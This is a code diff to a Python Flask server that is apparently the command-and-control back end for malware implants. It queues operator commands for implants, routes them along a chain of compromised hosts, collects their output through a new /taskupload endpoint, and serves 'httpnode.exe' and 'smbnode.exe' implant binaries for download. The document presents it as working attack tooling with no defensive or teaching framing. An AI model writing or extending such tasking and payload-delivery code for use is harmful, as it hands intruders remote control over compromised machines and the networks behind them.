@@ -39,10 +39,11 @@ class Operator(flask_login.UserMixin, db.Model):
 	password = db.Column(db.String, nullable=False)
 
 class Task(db.Model):
-	id=db.Column(db.Integer, primary_key=True)
+	id = db.Column(db.Integer, primary_key=True)
 	cmd = db.Column(db.String, nullable=False)
 	status = db.Column(db.String, nullable=False, default="Pending")
 	implant_id = db.Column(db.String, nullable=False)
+	output = db.Column(db.String, nullable=True)
 
 ###################
 #  Login Manager  #
@@ -87,31 +88,39 @@ def createtask(ProductID):
 	db.session.commit()
 	return redirect('/monitor')
 
-@app.route('/tasks/<ProductID>', methods=['GET'])
-def get_tasks(ProductID):
-	# Update last checkin time
-	implant = Implant.query.get(ProductID)
-	implant.last_checkin = datetime.utcnow()
-	db.session.commit()
-	
-	# Generate path to host
-	hostname = implant.ComputerName
-	path = [hostname]
-	parentRelationship = Adjacency.query.filter_by(ChildHostname=hostname).first()
-	while(parentRelationship is not None):
-		hostname = parentRelationship.ParentHostname
-		path.insert(0, hostname)
+@app.route('/tasks', methods=['GET'])
+def get_tasks():
+	# Retrieve task	
+	task = Task.query.filter_by(status="Pending").first()
+	if(task is not None):
+		implant = Implant.query.filter_by(ProductID=task.implant_id).first()
+		# Generate path to host
+		hostname = implant.ComputerName
+		path = [hostname]
 		parentRelationship = Adjacency.query.filter_by(ChildHostname=hostname).first()
-	pathString = ','.join(path)
+		while(parentRelationship is not None):
+			hostname = parentRelationship.ParentHostname
+			path.insert(0, hostname)
+			parentRelationship = Adjacency.query.filter_by(ChildHostname=hostname).first()
+		pathString = ','.join(path)
 
-	# Send pending commands to implant
-	tasks = Task.query.filter_by(implant_id=ProductID).all()
-	strTasks = []
-	for task in tasks:
-		strTasks.append(task.cmd)
-	res = ','.join(strTasks)
-	
-	return jsonify({ "Path": pathString, "Tasks": res })
+		# Send pending commands to implant, update task status
+		task.status = "Issued"
+		db.session.commit()
+		return jsonify({ "Path": pathString, "Command": task.cmd })
+	else:
+		return jsonify({ "Path": "", "Command": "" })
+
+@app.route('/taskupload', methods=['POST'])
+def task_response():
+	data = request.json
+	implant = Implant.query.filter_by(ComputerName=data['Hostname']).first()
+	pid = implant.ProductID
+	linkedTask = Task.query.filter_by(implant_id=pid, cmd=data['Command'], status="Issued").first()
+	linkedTask.output = data['Output']
+	linkedTask.status = "Complete"
+	db.session.commit()
+	return jsonify({ "status": "success" })
 
 @app.route('/monitor')
 @flask_login.login_required
@@ -143,9 +152,13 @@ def register():
 		return flask.Response(response='Previously registered', status=200)
 	
 
-@app.route('/initial', methods=['GET'])
-def download_implant():
-	return send_from_directory(directory=app.root_path, filename='initial.exe')
+@app.route('/httpnode', methods=['GET'])
+def download_httpnode():
+	return send_from_directory(directory=app.root_path, filename='httpnode.exe')
+
+@app.route('/smbnode', methods=['GET'])
+def download_smbnode():
+	return send_from_directory(directory=app.root_path, filename='smbnode.exe')
 
 if __name__ == "__main__":
 	app.run(port=5000, debug=True)
